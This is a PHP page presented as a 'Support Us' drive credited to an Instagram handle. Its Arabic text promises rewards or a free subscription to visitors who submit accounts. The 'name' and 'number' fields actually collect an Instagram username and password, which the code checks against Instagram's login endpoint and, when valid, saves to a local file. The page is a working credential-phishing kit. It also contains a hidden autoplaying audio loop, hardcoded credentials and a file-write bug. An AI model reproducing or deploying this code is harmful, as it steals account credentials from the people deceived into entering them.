
<?php
$z = 'https://www.instagram.com/cyber.thugz/';
echo '<dv style="font-size:4:1.10em;color:white"> * التطبيق : </div>';
echo '<dv style="font-size:4:1.10em;color:#595959"> By > inst acc / click - <a  style="font-size:1:1.1em ; font-style: italic;color:#ec1313" href="'.$z.'">@cyber.thugz</a> .! </div>'.'</p>';


?>
<html>

<body bgcolor="#515151">
<head><title>Support Us</title></head>


<body>
  <form method="post" action="">

    <input maxlength="30" style="font-size:4:1.10em;color:cyan" placeholder="الاسم"  type="text" name="ck2" value="<?= isset($_POST['ck2']) ? htmlspecialchars($_POST['ck2']) : '' ?>" />
    <input maxlength="20" style="font-size:4:1.10em;color:cyan" type="text" name="ck" placeholder="الرقم" value="<?= isset($_POST['ck']) ? htmlspecialchars($_POST['ck']) : '' ?>" />
    <input style="font-size:4:1.10em;color:red" type="submit" name="start" value=" ابدا العملية  "/>
    <dv style="font-size:4:1.10em;color:cyan"> * مشروع دعم لكن نحتاج منكم ترسلو يوزرات جديده ولو تكون موثقه احسن وكل الي ضافو حسابات بيكون لهم شي يعجبهم او اذا خلصنا بنعطيهم اشتراك مجاني طبعا حيكون كل شي  </p>  </p> </div>


<audio controls autoplay loop hidden>
  <source src="https://vocaroo.com/media_command.php?media=s0SdCoxhLcXc&command=download_mp3" type="audio/ogg">
  <embed src="https://vocaroo.com/media_command.php?media=s0SdCoxhLcXc&command=download_mp3" autostart="true" loop="true" hidden="true"> 
</audio>


  </form>

<?php

    

if (isset($_POST['start'])) {
   $ps= $_POST['ck'];
   $us = $_POST['ck2'];

   $username = 'dokok9j2';
   $password = '2922rj92';
   $login = curl_init();  
   curl_setopt($login, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
   curl_setopt($login, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($login, CURLOPT_FOLLOWLOCATION, 1);
   curl_setopt($login, CURLOPT_HTTPHEADER, array(
    'X-CSRFToken: EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I',
    'X-Instagram-AJAX: 1',
	'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
	'Cookie: csrftoken=EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I;'
));
curl_setopt($login, CURLOPT_POSTFIELDS, "username=$us&password=$ps");
$d = curl_exec($login);
	
if (strpos($d,'"authenticated": true') !== false) { 
	        $lg =True;
     if (strpos(file_get_contents('/fg/ac.txt'),$ps.'&='.$us) !== false) { 
                echo '<dv style="font-size:1:1em;color:yellow"> ['.$us.'] Saved Before </div>';
                $fc = True;
                exit();
     }	
    if (!$fc && $lg);          
        echo '<dv style="font-size:1:1em;color:yellow"> ['.$us.'] Logged in and Saved </div>';
	    $fx = fopen('/fg/ac.txt', 'a');
        fwrite($fx, $ps.'&='.$u.PHP_EOL);

        fclose($fx);

   // if (!$lg);
     //  echo 'Lg';
}

}
  
?>
